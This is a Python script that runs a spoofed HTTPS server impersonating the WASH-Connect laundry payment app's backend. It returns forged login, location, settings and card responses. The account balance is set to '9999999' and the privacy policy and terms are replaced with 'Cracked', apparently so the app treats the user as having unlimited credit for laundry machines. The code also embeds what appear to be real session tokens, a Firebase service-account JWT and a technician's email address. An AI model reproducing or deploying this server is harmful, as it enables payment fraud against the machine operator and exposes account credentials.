import http.server, socketserver
import ssl

listen_port = 443

STR_1 = '{"status":200,"location":{"location_id":"8025","location_name":"6110 186th Pl NE","sitecode":"000001","uln":"WA7502986   ","device_type":"connect","support_atrium_card":"0","atrium_card_key":"","atrium_google_pay_key":"","atrium_apple_wallet_key":"","atrium_apple_credential_key":"","atrium_campus_id_attribute_name":"","support_transact_card":"0","transact_encrypted_package":"","transact_institution_route_id":null,"touchnet_wallet":"0","kiosoft_wallet":"1","atrium_wallet":"0","touchnet_wallet_alias":"","kiosoft_wallet_alias":"","atrium_wallet_alias":"","atrium_api_url":"","bluetooth_capability":true,"mobile_compatibility":true,"machine_selection_method":"1","hide_refund":"1","offline":"1","facebook_ability":"0","google_ability":"0","technician_email":"gsalazar@washlaundry.com","datetime":"2021-10-04 15:54:57","service_only":"0","service_only_enable_time":"0000-00-00 00:00:00","verification_avs":"0","vendor_key":null,"coin_trans":"0","value_trans":"0","app_trans":"0","credit_trans":"0","start_app_ad":"0","start_app_level":"","address_line1":null,"address_line2":null,"stack_combo_label":"1","support_cloud_based_card":"0","support_loves_card":"0","loves_store_number":null,"touchnet_api_url":"","touchnet_terminal_id":"","touchnet_terminal_type":"","touchnet_operator_id":"","touchnet_operator_password":"","terminal_multilingual":"0","encryption":"0","sms_ability":1,"bonus_ability":0,"referal_ability":0},"rooms":[{"id":"10159","room_name":"LR001: L Bldg.","uvid":"0","location_id":"8025","room_id":"1","range_type":"1","range":"1-255","uln_id":null},{"id":"10160","room_name":"LR002: H Bldg.","uvid":"0","location_id":"8025","room_id":"2","range_type":"1","range":"1-255","uln_id":null}],"laundry_portal_version":"2.34.4.0","payment_method":[[{"status":"success","name":"CleanPay Account","payment":"enable","trans_type":"1"},{"status":"success","name":"OneCard Account","payment":"disable","trans_type":"3"},{"status":"success","name":"Atrium Account","payment":"disable","trans_type":"6"}]]}'

STR_2 = '{"settings":{"cache_expiration":{"location":300},"debug":{"allowVirtualMachines":true,"enableBTLogging":false},"dev":{"refill_base":"https://dev.getwashconnect.com:5009","refill_url":"https://dev.getwashconnect.com:5009/tenant/refill_account"},"email_config":{"service_call":{"body":"A service request has been created for you. The request ID is {request_number}. Please use this number when calling customer support.","return_path":"app.beta@washlaundry.com","sender_email":"mobilesupport@washlaundry.com","subject":"WASH-Connect Service Request {request_number}"}},"feature_flags":{"bottom_nav":{"CA0002260":true,"CA0005340":true,"CA0005472":true,"CA0029120":true,"CA7505652":true,"CA8604031":true,"IL7502056":true,"TEST12345":true,"all_ulns":true},"dev_logging":false,"freshchat":false,"inapp_review":true,"location_manual":true,"location_qr":false,"payment_types":{"amex":true,"discover":true,"mastercard":true,"visa":true},"refund":true,"resources":true,"service_request":true},"feedback":{"body":"Please tell us your issue…","description":"Please help us make this app great:","email":"mobilesupport@washlaundry.com","email_subject":"WASH-Connect App Feedback","title":"Feedback"},"help":{"body":"Please tell us your issue…","description":"Need help using the app? Email us at {support_email} for more help.","email":"mobilesupport@washlaundry.com","email_subject":"WASH-Connect App Support","phone":" ","title":"Need Help?"},"privacy_policy":{"html_text_v2":"` <html> <h3 style=\"text-align: center;\"> Cracked </h3>  </html> `","last_updated":"January 1, 2023","text":"W Cracked CA 90245","title":"WASH PRIVACY POLICY"},"refill_base":"https://valuecode.getwashconnect.com","refill_url":"https://valuecode.getwashconnect.com/tenant/refill_account","refund_config":{"avs_vend":"Credit","refund_issued":"Code","vend_method":"Credit"},"requireEmailVerification":false,"resources_url":"https://www.wash.com/resource-page/","terms":{"last_updated":"January 18, 2019","text":"` <html> <h3 style=\"text-align: center;\"> Cracked </h3>  </html> `","title":"TERMS OF USE"},"tutorial_url":"https://www.youtube.com/embed/Z1XpmAVBP-w","version":{"current":"4.0.1","minimum":"0.0.0"}}}'

class my_handler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain; charset=utf-8")
        self.end_headers()
    def do_GET(self):
        self.send_response(200)
        if self.path.startswith('/account_balance'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"status":200,"account_number":"000000828463","account_balance":"9999999","atrium_campus_id":"","atrium_balance":""}'.encode('utf-8'))
            return

        if self.path.startswith('/locations?'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(STR_1.encode('utf-8'))
            return

        if self.path.startswith('/get_user_notifications_v1'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"status":"ok","error":{"errorCode":0,"errorMessage":""},"notifications":[]}'.encode('utf-8'))
            return

        if self.path.startswith('/app_settings'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(STR_2.encode('utf-8'))
            return

#        if self.path.startswith(''):
#            self.send_header("content-type","application/json; charset=utf-8")
#            self.end_headers()
#            self.wfile.write(''.encode('utf-8'))
#            return

        self.send_response(403)
        self.send_header("Content-type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write('invalid get query.'.encode('utf-8'))
    def do_POST(self):
        self.send_response(200)
        if self.path.startswith('/login'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"status":200,"user_id":"828463","user_level":"0","phone":"2061112222","bonus":"0","autorefill":"0","referring":"0","referred":"0","account_referred":"0","token":"U2FsdGVkX19Z0XP/RVPRwqWNFNmewMJv0D484g8kD5U3OIvqDPd4gFwL+TZ3Qup20aP4edRX3XjyEMnuCapYLZCdbnB136AMNWb5z5asUzNcv2H2ldu0x+qDJRnbD7FY","account_number":"000000828463","account_balance":"9999999","zipcode":"98052","inject_vendor_key":"0","setup":"0","collect":"0","get_reader_info":"0","service_mode_kill":"0","update_reader":"0","signal_test":"0","ultra_functions":"0","reboot":"0","scan_room":"0","factory_reset":"0","cnvert_bt_name":"0","set_up_test":"0","error_enquiries":"0","refill_user_account":"0","emailVerified":true,"validated":false,"email_verification_sent":false,"last_uln":"WA7502986","last_srcode":null,"device_type":"connect","displayName":"fuck","email_address":"wash@tmp.recolic.cc","firebase_token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2lkZW50aXR5dG9vbGtpdC5nb29nbGVhcGlzLmNvbS9nb29nbGUuaWRlbnRpdHkuaWRlbnRpdHl0b29sa2l0LnYxLklkZW50aXR5VG9vbGtpdCIsImlhdCI6MTY5MTA0MzQ5MiwiZXhwIjoxNjkxMDQ3MDkyLCJpc3MiOiJmaXJlYmFzZS1hZG1pbnNkay1qdm9oY0B3YXNobW9iaWxlcGF5LmlhbS5nc2VydmljZWFjY291bnQuY29tIiwic3ViIjoiZmlyZWJhc2UtYWRtaW5zZGstanZvaGNAd2FzaG1vYmlsZXBheS5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsInVpZCI6IjMyNk8yZ0xxQTRaRnpRQTBac1RRUldVTzRwYjIifQ.OW1hcu5nFc9eV3GoWOy75rfD4s_sk6U1JTJM9u6kJVBB_NPWOqP7eXDyM9z7_mrI9PBAs_qZlqYLqViL_h_fcOxeeFNcIJjyT9j1cT3AS6adES1qBcMZ37VJ4kXZPt9DvRP90J5gJU453LEEe2F0JxZO4ANZKi6E4DPv6Y-J228DDdhV3VHBnH5seOhDpQKZKJR3RMf4XiCv9EVXFwKJrDR1hFqYc9txBpR_uFdEr6AXBrmPzNUNLRGCsl_9eCyCGPB7a1j_suvzh2Qmdyuto4Ic2ZF50gh4ew-urM95uFYiK5XeqtCl2WXhC6cogTR3eCqfAuNrPdtsTvWV5zsBVg"}'.encode('utf-8'))
            return

        if self.path.startswith('/get_token'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"status":200,"debug_original_token":"000000828463A3020000230803061813000000000000050000010001A5A5A5A54D6171EDEC84047C30A903F8B0B040409B379B6CF4A54ECF6DE1D83FC22CABF12DC59C2FDB7C21EC8F63B36D5A28A3DCA15FCFF8A5D75A40749B0D4566F12EFA54145AEDF93ED959B934D2EDD7F6662D9E83E710F4C6D9E22FE83AD7262AD03A3D124C6E6D5173DA50BDF904F07ACBFFB07BA7B1652F2D295C3A99EE8D8714B54AE75705B9F9420E","debug_account_number":"000000828463","user_token":"U2FsdGVkX1+k6O+6x4HtJp5RgJ8IWafJ9GuvKQqzxUU7FEOfYkVi9GjOhfwmN0sr4GNA4pWzpFU8IrnagZXuwh9HK939FEjfIBqxHQ5od1KMu7crc9+WtddncXDCPLS0PAYAqXDPgQ1rYn4lNvWCG2QZIF+mTe3qWgoP7meNgJ3v/OPVQ6IXKCjEBignKBq7h8v10BjZl85KbdD/L+2hkQv8GxfMTgrejsm1IVlqT0YcxPvsebxSrM8vMhbE0Nc2f0aNLp/ziSNw+u66Rc13jhayRoHnasnDchxBM4R/rW/7nbgXHCCc7KpA6nqRYNaz/+0Yo0aiVQSYUWhWbz2tAOL6TPt7p+3+cqB/trkkPa84sQ0lNVFLFrq1PxZCnYQFT3j77hDojc4T5aYNRnPDaM5rRd34e56us240E3W7DSMiV/7Hl3wfYhIFOSzKpZH/rGK/84gACbzxckJ+PxwxzNzOo25Su7wIjrzvh8HVmgUmIIw0nfG72jFGOP1olaqFHCTaRMaPvKsZgMmaiJmzlw=="}'.encode('utf-8'))
            return
        if self.path.startswith('/api/locations/get_location_uln_srcode'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"uln":"WA7502986"}'.encode('utf-8'))
            return

        if self.path.startswith('/api/payment/card_info'):
            self.send_header("Server","nginx")
            self.send_header("content-type","application/json; charset=utf-8")
            self.send_header("x-content-type-options","nosniff")
            self.send_header("x-frame-options","sameorigin")
            self.send_header("x-xss-protection","1; mode=block")
            self.send_header("access-control-allow-origin","*")
            self.end_headers()
            self.wfile.write('{"status":200,"card_type":"4","card_num":"5539"}'.encode('utf-8'))
            return
        if self.path.startswith('/api/5355472/envelope/'):
            self.send_header("Server","nginx")
            self.send_header("content-type","application/json")
            self.send_header("access-control-allow-origin","*")
            self.send_header("vary","origin,access-control-request-method,access-control-request-headers")
            self.send_header("access-control-expose-headers","x-sentry-error,x-sentry-rate-limits,retry-after")
            self.send_header("x-envoy-upstream-service-time","0")
            self.send_header("Via","1.1 google")
            self.send_header("Alt-Svc",'h3=":443"; ma=2592000,h3-29=":443"; ma=2592000')
            self.send_header("Connection","close")
            self.end_headers()
            self.wfile.write('{}'.encode('utf-8'))
            return
 
        if self.path.startswith('/get_machine_status_v1'):
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"status":"error","error":{"errorCode":400,"errorMessage":"No ULN provided"}}'.encode('utf-8'))
            return

        self.send_response(403)
        self.send_header("Content-type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write('invalid post query.'.encode('utf-8'))
    def do_PUT(self):
        self.send_response(200)
        if self.path.startswith('/update_machine_status_v1'):
            # I don't know what to send for this request... We need packet capture here!
            # This problem cause green "Pay" button loading forever for SOME machine.
            # Sending a guess reply... TODO: test if it's working fine.
            self.send_header("content-type","application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write('{"status":"ok","error":{"errorCode":0,"errorMessage":""},"notifications":[]}'.encode('utf-8'))
            return

        self.send_response(403)
        self.send_header("Content-type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write('invalid put query.'.encode('utf-8'))
 

try:
    server = http.server.HTTPServer(('', listen_port), my_handler)
    sslctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    sslctx.check_hostname = False # If set to True, only the hostname that matches the certificate will be accepted
    sslctx.load_cert_chain(certfile='example.com.crt', keyfile="example.com.key")
    server.socket = sslctx.wrap_socket(server.socket, server_side=True)
    print('Listening *:' + str(listen_port))
    server.serve_forever()
except KeyboardInterrupt:
    server.socket.close()

